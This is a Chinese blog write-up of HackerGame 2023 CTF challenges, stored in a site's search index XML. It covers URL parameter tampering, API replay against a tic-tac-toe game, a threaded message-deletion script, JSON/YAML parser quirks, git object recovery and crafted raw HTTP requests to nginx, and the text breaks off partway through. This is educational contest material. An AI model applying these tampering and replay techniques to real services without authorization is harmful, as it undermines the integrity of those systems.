<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>【HackerGame2023】 WriteUp</title>
    <link href="/2023/11/04/HackerGame2023/"/>
    <url>/2023/11/04/HackerGame2023/</url>
    
    <content type="html"><![CDATA[<h1 id="HackerGame-2023-WriteUp"><a href="#HackerGame-2023-WriteUp" class="headerlink" title="HackerGame 2023 WriteUp"></a>HackerGame 2023 WriteUp</h1><h2 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h2><p>今年 hackergame 圆满结束，很享受的一次旅程（同时也有点折磨 QAQ），hackergame 这一个星期 ddl 挺多的，所以本次名次并不高，校内 15 名，总排名 226，这篇博客记录的不仅仅是自己做出来的题目的 WP，同时也对官方题解和我感兴趣的题目做一个 log，学习多点知识。</p><h2 id="WP-部分"><a href="#WP-部分" class="headerlink" title="WP 部分"></a>WP 部分</h2><h3 id="HackerGame-启动"><a href="#HackerGame-启动" class="headerlink" title="HackerGame 启动"></a>HackerGame 启动</h3><p>签到题，打开题目后让你大声喊出 hackergame 启动！要求准确率到达百分之 99.99%，这是不可能的，上传的时候发现他是在 url 传参的，改一下参数(simularity&#x3D;99.999)就过了。</p><p><img src="/2023/11/04/HackerGame2023/1.png"></p><h3 id="猫咪小测"><a href="#猫咪小测" class="headerlink" title="猫咪小测"></a>猫咪小测</h3><p>今年猫咪小测一共有四道题：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">1. 想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？（是一个非负整数）<br></code></pre></td></tr></table></figure><p>答：这道题给了提示是一个非负整数，而且图书馆不会很高，直接 0-20 爆破就行了。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>. 今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 <span class="hljs-number">10</span> 的多少次方每立方秒差距？（是一个非负整数）<br></code></pre></td></tr></table></figure><p>找学术论文这里用中文一定是不可行的，用 chatgpt 翻译成英语：“The upper limit of the density of chickens in the observable universe”，之后再谷歌搜索即可得到论文，答案是 23。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">3.</span> 为了支持 TCP BBR 拥塞控制算法，在编译 Linux 内核时应该配置好哪一条内核选项？(输入格式为 CONFIG<span class="hljs-emphasis">_XXXXX)</span><br></code></pre></td></tr></table></figure><p>问 chatgpt，答案为 CONFIG_TCP_CONG_BBR。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 MyPY mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？（会议的大写英文简称，比如 ISCA、CCS、ICML。）<br></code></pre></td></tr></table></figure><p>我的做法是直接爆破所有的和 python 有关的学术会议，最后爆破出来是 ECOOP。官方题解则是以”python type check mypy halting problem”为关键词搜索对应的学术论文。</p><h3 id="更深更暗"><a href="#更深更暗" class="headerlink" title="更深更暗"></a>更深更暗</h3><p>进去后，提示我们要翻到最底下。<br><img src="/2023/11/04/HackerGame2023/2.png"></p><p>我们直接 bp 抓包，看源代码，发现 flag 是 token 的哈希加密值，直接在本地复现即可：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">CryptoJS</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto-js&#x27;</span>);<br><span class="hljs-keyword">let</span> token =<br>  <span class="hljs-string">&#x27;340:MEQCID15NFRrTG68kB61LStGU/dVdE7xfkJYGlzMvO+UEfRyAiBZn5rm5XJZ4RBT54m7Qdu/fLoKzne1MGfiXFaPbNKuhQ==&#x27;</span>;<br><span class="hljs-keyword">let</span> hash = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-title class_">SHA256</span>(<span class="hljs-string">`dEEper_@nd_d@rKer_<span class="hljs-subst">$&#123;token&#125;</span>`</span>).<span class="hljs-title function_">toString</span>(<br>  <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Hex</span><br>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`flag&#123;T1t@n_<span class="hljs-subst">$&#123;hash.slice(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>)&#125;</span>&#125;`</span>);<br></code></pre></td></tr></table></figure><h3 id="旅行照片-3-0"><a href="#旅行照片-3-0" class="headerlink" title="旅行照片 3.0"></a>旅行照片 3.0</h3><p>一年一度的社工题，这里分享我的做法。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">题目<span class="hljs-number">1</span>-<span class="hljs-number">2</span>：<br><span class="hljs-number">1</span>、你还记得与学长见面这天是哪一天吗？（格式：yyyy-mm-<span class="hljs-selector-tag">dd</span>）<br><span class="hljs-number">2</span>、在学校该展厅展示的所有同种金色奖牌的得主中，出生最晚者获奖时所在的研s究所缩写是什么？<br></code></pre></td></tr></table></figure><p>首先确认时间是在暑假发生，然后仔细观察图片，发现有：</p><p><img src="/2023/11/04/HackerGame2023/3.png"></p><p>谷歌一搜发现是学术会议 statphys28，一搜发现时间在 8 月 7 日-8 月 11 日举行，举行地点是东京，其实就已经确认了学长是在东京大学读书，时间一个很小的范围，把第二道题确认下来爆破。</p><p>第二道题给了一个奖牌，上面有个人名：<strong>M.KOSHIBA</strong></p><p>搜索后发现是诺贝尔物理学奖获得者，这里就需要寻找东京大学诺贝尔物理学奖获得者最年轻的那位：</p><p><img src="/2023/11/04/HackerGame2023/4.png"></p><p>发现是梶田隆章，研究所的缩写为 ICRR，然后根据这个一起去爆破第一问的时间，确认答案为：</p><p><strong>2023-8-10</strong>和<strong>ICRR</strong></p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">题目3<span class="hljs-string">-4</span><br>3、帐篷中活动招募志愿者时用于收集报名信息的在线问卷的编号（以字母 S 开头后接数字）是多少？<br>4、学长购买自己的博物馆门票时，花费了多少日元？<br></code></pre></td></tr></table></figure><p>对于第 3 题，谷歌对帐篷图片识图，发现是上野公园，谷歌搜索上野公园 2023 年 8 月 10 日的活动，看到有个梅酒节活动，里面有 staff 大募集，能拿到问卷编号。</p><p><img src="/2023/11/04/HackerGame2023/5.png"></p><p>对于第 4 题，上野公园的博物馆基本可以确定是东京国立博物馆，直接去搜他的官网，发现他是对大学生免费的，所以答案就是<strong>0</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">题目<span class="hljs-number">5</span>-<span class="hljs-number">6</span><br><span class="hljs-number">5</span>、学长当天晚上需要在哪栋标志性建筑物的附近集合呢？(请用简体中文回答，四个汉字)<br><span class="hljs-number">6</span>、进站时，你在 JR 上野站中央检票口外看到「ボタン＆カフリンクス」活动正在销售动物周边商品，该活动张贴的粉色背景海报上是什么动物（记作 <span class="hljs-selector-tag">A</span>，两个汉字）？ 在出站处附近建筑的屋顶广告牌上，每小时都会顽皮出现的那只 <span class="hljs-number">3</span>D 动物是什么品种？（记作 <span class="hljs-selector-tag">B</span>，三个汉字）？（格式：<span class="hljs-selector-tag">A</span>-<span class="hljs-selector-tag">B</span>）<br></code></pre></td></tr></table></figure><p>对于第 5 题，我当时猜测集合地点可能是坐船的地点，然后把浅草那边所有的码头的枚举了都不对，然后仔细看看，发现“学长即将开始他的学术之旅”，就又回去看了看 statphys28，发现他是在晚上举行的，statphys28 的官网有谷歌地图定位：</p><p><img src="/2023/11/04/HackerGame2023/6.png"></p><p>进去后发现是在<strong>安田讲堂</strong>：</p><p><img src="/2023/11/04/HackerGame2023/7.png"></p><p>对于第 6 题，直接在推特搜”ボタン＆カフリンクス”</p><p><img src="/2023/11/04/HackerGame2023/8.png"></p><p>可以确定是个熊猫，第二小问就比较离谱了，我当时没注意看是<strong>出站附近</strong>，以为是上野站附近的广告牌有 3d 小动物，看了很久的街景都没发现有（心想这地方那么村，怎么会有超大的 3d 广告牌），后来没头绪了仔细看了一下，发现是出站，他的第三张图片是去了任天堂马里奥世界，在涩谷，那就很简单了，在涩谷站出站每小时都会顽皮出现的那只 3D 动物就是<strong>秋田犬</strong></p><h3 id="赛博井字棋"><a href="#赛博井字棋" class="headerlink" title="赛博井字棋"></a>赛博井字棋</h3><p>这道简单题卡了我挺久 QAQ，进去后抓包看他 script.js 的内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">setMove</span>(<span class="hljs-params">x, y</span>) &#123;<br>  <span class="hljs-keyword">if</span> (board[x][y] != <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (frozen) &#123;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-keyword">let</span> url = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>;<br>  <span class="hljs-keyword">let</span> data = &#123; <span class="hljs-attr">x</span>: x, <span class="hljs-attr">y</span>: y &#125;;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetch</span>(url, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>    <span class="hljs-attr">headers</span>: &#123;<br>      <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>    &#125;,<br>    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data),<br>  &#125;).<span class="hljs-title function_">catch</span>(errorHandler);<br>&#125;<br></code></pre></td></tr></table></figure><p>仔细思考发现，他这个下棋的判断逻辑是在前端就已经写好了，即<strong>他是通过前端组件对棋盘进行判断的</strong>，这样的话我们直接重放 api 传合法的参数，就能把 ai 下的棋子篡改成我们的棋子，获得 flag：</p><p><img src="/2023/11/04/HackerGame2023/9.png"></p><h3 id="奶奶的睡前-flag-故事"><a href="#奶奶的睡前-flag-故事" class="headerlink" title="奶奶的睡前 flag 故事"></a>奶奶的睡前 flag 故事</h3><p>这道题我居然没做出来，真的就是没看提示（谷歌亲儿子），我以为是 png 隐写，结果是 pixel 的漏洞，谷歌 pixel 自带的截图编辑工具截出来的图，我们是可以把它已经裁剪过的截图给复原的，用网站：<br><a href="https://acropalypse.app/">https://acropalypse.app</a></p><p><img src="/2023/11/04/HackerGame2023/10.png"></p><h3 id="组委会模拟器"><a href="#组委会模拟器" class="headerlink" title="组委会模拟器"></a>组委会模拟器</h3><p>Web 编程题，这里需要注意的是，在发送报文的时候，不要等待获取了响应之后再发新的报文，发送了一个报文后马上要<strong>开一个新的线程</strong>去发下一个报文。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-comment"># 设置 session</span><br>session = requests.Session()<br>session.cookies.<span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;session&quot;</span>, <span class="hljs-string">&quot;eyJ0b2tlbiI6IjM0MDpNRVFDSUQxNU5GUnJURzY4a0I2MUxTdEdVL2RWZEU3eGZrSllHbHpNdk8rVUVmUnlBaUJabjVybTVYSlo0UkJUNTRtN1FkdS9mTG9Lem5lMU1HZmlYRmFQYk5LdWhRPT0ifQ.ZT4eFw.eaokXgOWqIaaKVpIijCDrvuxRLo&quot;</span>, domain=<span class="hljs-string">&quot;202.38.93.111&quot;</span>)<br><br><span class="hljs-comment"># 获取消息</span><br>response = session.post(<span class="hljs-string">&quot;http://202.38.93.111:10021/api/getMessages&quot;</span>)<br>data = response.json()<br><br><span class="hljs-comment"># 提取所有 hack[...] 格式的消息及其 delay</span><br>messages = []<br><span class="hljs-keyword">for</span> i, message <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(data[<span class="hljs-string">&quot;messages&quot;</span>]):<br>    text = message[<span class="hljs-string">&quot;text&quot;</span>]<br>    delay = message[<span class="hljs-string">&quot;delay&quot;</span>]<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">match</span> := re.search(<span class="hljs-string">r&#x27;hack\[\w+\]&#x27;</span>, text)):<br>        messages.append((i, delay, <span class="hljs-keyword">match</span>.group()))<br><br><span class="hljs-comment"># 对消息按 delay 排序</span><br>messages.sort(key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># 删除消息的函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_message</span>(<span class="hljs-params">message</span>):<br>    response = session.post(<span class="hljs-string">&quot;http://202.38.93.111:10021/api/deleteMessage&quot;</span>, json=&#123;<span class="hljs-string">&quot;id&quot;</span>: message[<span class="hljs-number">0</span>]&#125;)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Deleted message:&quot;</span>, message[<span class="hljs-number">2</span>], <span class="hljs-string">&quot;| Response:&quot;</span>, response.text)<br><br><span class="hljs-comment"># 发送删除请求</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(messages)):<br>    <span class="hljs-keyword">if</span> i &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-comment"># 等待 delay[i] - delay[i-1] 时间</span><br>        time.sleep(<span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>,messages[i][<span class="hljs-number">1</span>] - messages[i-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]))<br>    <span class="hljs-comment"># 开启新线程来发送删除请求</span><br>    threading.Thread(target=delete_message, args=(messages[i],)).start()<br><br><span class="hljs-comment"># 等待最后一个消息被删除</span><br>time.sleep(<span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>,<span class="hljs-number">3</span> - messages[-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]))<br><br><span class="hljs-comment"># 获取 flag</span><br>time.sleep(<span class="hljs-number">2</span>) <span class="hljs-comment">#等待所有线程运行完毕</span><br>response = session.post(<span class="hljs-string">&quot;http://202.38.93.111:10021/api/getflag&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag:&quot;</span>, response.text&#125;<br></code></pre></td></tr></table></figure><p>跑完就能获取到 flag 了。</p><p>这里需要探讨一下官方的做法。</p><p>官方的做法是在浏览器里嵌入脚本：他这里的脚本就是每隔 100 毫秒查找出网页中包含 flag 的所有可点击的消息元素，然后点击它。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">setInterval</span>(<br>  <span class="hljs-function">() =&gt;</span><br>    <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;.fakeqq-message__bubble&#x27;</span>))<br>      .<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">element</span>) =&gt;</span> element.<span class="hljs-property">innerHTML</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&#x27;hack[&#x27;</span>) != -<span class="hljs-number">1</span>)<br>      .<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">element</span>) =&gt;</span> element.<span class="hljs-title function_">click</span>()),<br>  <span class="hljs-number">100</span><br>);<br></code></pre></td></tr></table></figure><p>“右键检查或按下 F12 键打开浏览器的开发者工具，选择「控制台」。将该脚本粘贴到控制台中，刷新页面（以重新开始题目）后按下回车执行脚本，就能自动撤回了。所有消息加载完毕后再稍等几秒，即可看到真正的 flag。”</p><h3 id="虫"><a href="#虫" class="headerlink" title="虫"></a>虫</h3><p>满扫描电视，SSTV 图片传输，这里可以直接使用解码的脚本解码，跑出来直接就有 flag 了。</p><p>官方的解法使用解码软件，Linux 上的 QSSTV，然后使用 PipeWire 将播放器音频连接到 QSSTV 输入，解码获得到 flag。</p><h3 id="JSON-⊂-YAML"><a href="#JSON-⊂-YAML" class="headerlink" title="JSON ⊂ YAML?"></a>JSON ⊂ YAML?</h3><p>题目：</p><p>你知道吗？Hackergame 出题时，每道题都需要出题人用 YAML 格式写下题目的关键信息。然而，每年总有一些出题人在编写 YAML 文件时被复杂的语法规则弄得头疼不已。</p><p>这天小 Z 又找到小 W 说：「我昨天写 YAML 时，又花了半天研究 YAML 的规范，YAML 好难啊！」</p><p>小 W 惊讶道：「怎么会有人不会写 YAML 呢？只要你会写 JSON 就会写 YAML 呀，因为任何合法的 JSON 本身就是合法的 YAML。」</p><p>小 Z 听闻这番言论后当场表示怀疑，立刻说出了一个字符串，JSON 和 YAML 解析出的含义存在差异。小 W 研究了一番才发现，这是因为很多主流的 YAML 库仍然是 YAML 1.1 的，它没有这个性质。他不得不承认：「好吧，这个性质只适用于 YAML 1.2。」</p><p>小 Z 笑了：「别提 YAML 1.2 了，它遇到合法的 JSON 都有可能报错。」</p><p>这个题目很有意思，就是 JSON 和 YAML 文件合法性的检查，要找两个，分别是</p><ul><li>JSON 和 YAML1.1</li><li>JSON 和 YAML1.2</li></ul><p>JSON 和 YAML 都是一种序列化格式。对于 JSON 和 YAML1.1：</p><p>我们先来对比 JSON 和 YAML1.1 的格式，JSON 中的数字格式是严格额，不能用前导正号，前导 0，小数点后面必须有数字。而 YAML1.1 是很宽松的，并没有一个确定的规则来决定一个未标注类型的字符串应该被解释成扫描类型，对于科学计数法，它<strong>强调小数点是必须的</strong>，所以在这个题中，可以构建<strong>1e1</strong>来获得 flag，在 JSON 中它会被解释成 10，而在 YAML1.1 中就是 1e1 这个字符串，因为他没有小数点。</p><p>官方给的解释中，提到了两条规则：</p><ol><li>是否有小数点</li><li>指数部分是否有正负号</li></ol><p>这两条规则都可以导致 JSON 和 YAML 解释不一样。</p><p>对于 JSON 和 YAML1.2：</p><p>YAML1.2 中明确规定了在遇到重复的键时必须报错，所以这里绕过比较简单，就是构造两个键名一样的参数即可。</p><p>最后结果：</p><p><img src="/2023/11/04/HackerGame2023/11.png" alt="Alt text"></p><h3 id="Git-Git"><a href="#Git-Git" class="headerlink" title="Git? Git"></a>Git? Git</h3><p>题目：<br>「幸亏我发现了……」马老师长吁了一口气。</p><p>「马老师，发生甚么事了？」马老师的一位英国研究生问。</p><p>「刚刚一不小心，把 flag 提交到本地仓库里了。」马老师回答，「还好我发现了，撤销了这次提交，不然就惨了……」</p><p>「这样啊，那太好了。」研究生说。</p><p>马老师没想到的是，这位年轻人不讲武德，偷偷把他的本地仓库拷贝到了自己的电脑上，然后带出了实验室，想要一探究竟…</p><p>我的方法简单粗暴，就是写一段脚本遍历所有 git 对象，然后打印出来，看看长不长，不长的话直接在里面找 flag，在本地文件夹 touch 建立一个文件，用 vim 打开，复制脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>objects_dir=<span class="hljs-string">&quot;.git/objects&quot;</span><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">dir</span> <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">ls</span> <span class="hljs-variable">$objects_dir</span>); <span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$dir</span>&quot;</span> != <span class="hljs-string">&quot;info&quot;</span> ] &amp;&amp; [ <span class="hljs-string">&quot;<span class="hljs-variable">$dir</span>&quot;</span> != <span class="hljs-string">&quot;pack&quot;</span> ]; <span class="hljs-keyword">then</span><br>      <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">ls</span> <span class="hljs-variable">$objects_dir</span>/<span class="hljs-variable">$dir</span>); <span class="hljs-keyword">do</span><br>          object_hash=<span class="hljs-string">&quot;$dir<span class="hljs-variable">$file</span>&quot;</span><br>          object_content=$(git cat-file -p <span class="hljs-variable">$object_hash</span> 2&gt;/dev/null)<br>          <span class="hljs-keyword">if</span> [ ! -z <span class="hljs-string">&quot;<span class="hljs-variable">$object_content</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>              <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Object <span class="hljs-variable">$object_hash</span>:&quot;</span><br>              <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$object_content</span>&quot;</span><br>              <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;----------------------------------------&quot;</span><br>          <span class="hljs-keyword">fi</span><br>      <span class="hljs-keyword">done</span><br>  <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>打印出来之后找到 flag。</p><p>官方题解是先通过 <code>git reflog</code> 查看完整操作历史，然后找到他最后一次的提交 hash，用 <code>git reset</code>回退到这次提交，查看 <code>README.md</code> 文件获得。</p><h3 id="HTTP-集邮册"><a href="#HTTP-集邮册" class="headerlink" title="HTTP 集邮册"></a>HTTP 集邮册</h3><p>题目：<br>本题中，你可以向一个 nginx 服务器（对应的容器为默认配置下的 nginx:1.25.2-bookworm）发送 HTTP 请求。你需要获取到不同的 HTTP 响应状态码以获取 flag，其中：</p><p>获取第一个 flag 需要收集 5 种状态码；<br>获取第二个 flag 需要让 nginx 返回首行无状态码的响应（不计入收集的状态码中）；<br>获取第三个 flag 需要收集 12 种状态码。<br>关于无状态码的判断逻辑如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">crlf = buf.find(<span class="hljs-string">b&quot;\r\n&quot;</span>)<br><span class="hljs-keyword">if</span> buf.strip() != <span class="hljs-string">b&quot;&quot;</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> crlf == -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;No CRLF found&quot;</span>)<br>        status_line = buf[:crlf]<br>        http_version, status_code, reason_phrase = status_line.split(<span class="hljs-string">b&quot; &quot;</span>, <span class="hljs-number">2</span>)<br>        status_code = <span class="hljs-built_in">int</span>(status_code)<br>    <span class="hljs-keyword">except</span> ValueError:<br>        buf += <span class="hljs-string">&quot;（无状态码）&quot;</span>.encode()<br>        status_code = <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><p>先来说说第二个 flag 的获得方式，根据上面这个代码，它查找第一个<code>\r\n</code>换行符时会尝试解析状态行，如何让他不返回状态码呢，这里我做的时候就是 fuzz 出来的，一个个试，其实不知道他的原理，看了官方文档才知道，构造 payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> /\r\n<br></code></pre></td></tr></table></figure><p>即可获得 flag，这是因为这里发送的是 HTTP&#x2F;0.9 请求，这个请求只支持 GET，响应就直接响应文件内容，这样的请求没有状态码。</p><p>第一个 flag 和第三个 flag，我构造的 payload 和原理：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">GET /<span class="hljs-number">50</span>x.html HTTP/<span class="hljs-number">1.1</span>\r\nHost: localhost\r\nIf-None-<span class="hljs-name">Match</span>: <span class="hljs-string">&quot;64dbafc8-1f1&quot;</span>\r\n\r\n<br>返回 <span class="hljs-number">304</span>，这里需要获取资源的 e-tag, <span class="hljs-number">304</span>代表文件在指定条件下没有修改过。<br><br>POST / HTTP/<span class="hljs-number">1.1</span>\r\nHost: localhost\r\nContent-<span class="hljs-name">Length</span>: <span class="hljs-number">10000000</span>\r\n\r\n<br>返回 <span class="hljs-number">413</span>，超出Content的范围<br><br>GET / HTTP/<span class="hljs-number">1.1</span>\r\nHost: localhost\r\nIf-<span class="hljs-name">Match</span>: <span class="hljs-string">&quot;12345&quot;</span>\r\n\r\n<br>返回 <span class="hljs-number">412</span>，发送一个带有失败前提条件的请求，这里用If-Match尝试去匹配etag，匹配失败就会返回<span class="hljs-number">412</span><br><br>POST / HTTP/<span class="hljs-number">1.1</span>\r\nHost: localhost\r\n\r\n<br>返回 <span class="hljs-number">411</span>，没有 Content-Length 头<br><br>PUT /index.html HTTP/<span class="hljs-number">1.1</span>\r\nHost: localhost\r\n\r\n<br>返回 <span class="hljs-number">405</span>，PUT方法被禁止<br><br>GET /a HTTP/<span class="hljs-number">1.1</span>\r\nHost: localhost\r\n\r\n<br>返回 <span class="hljs-number">404</span><br><br>GET / HTTP/<span class="hljs-number">1.1</span>\r\nHost: localhost\r\n\r\n<br>返回 <span class="hljs-number">400</span>，不符合HTTP格式要求<br><br>GET / HTTP/<span class="hljs-number">1.1</span>\r\nHost: localhost\r\<span class="hljs-name">nExpect</span>: <span class="hljs-number">100</span>-continue\r\n\r\n<br>返回 <span class="hljs-number">100</span>，nginx 只支持 <span class="hljs-number">100</span>-<span class="hljs-keyword">continue</span> 的 expect 回带，这里会返回 <span class="hljs-number">100</span>-<span class="hljs-keyword">continue</span>，<span class="hljs-number">100</span>-<span class="hljs-keyword">continue</span>代表服务器希望客户端继续请求或者忽略<br><br>GET / HTTP/<span class="hljs-number">1.1</span>\r\nHost: localhost\r\n\r\n<br>返回 <span class="hljs-number">200</span><br><br>GET / HTTP/<span class="hljs-number">5.5</span>\r\nHost: localhost\r\n\r\n<br>返回 <span class="hljs-number">505</span>，不支持该 http 方法<br><br>GET /aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa... HTTP/<span class="hljs-number">1.1</span>\r\nHost: localhost\r\n\r\n<br>返回 <span class="hljs-number">414</span>，请求头太长<br><br>GET / HTTP/<span 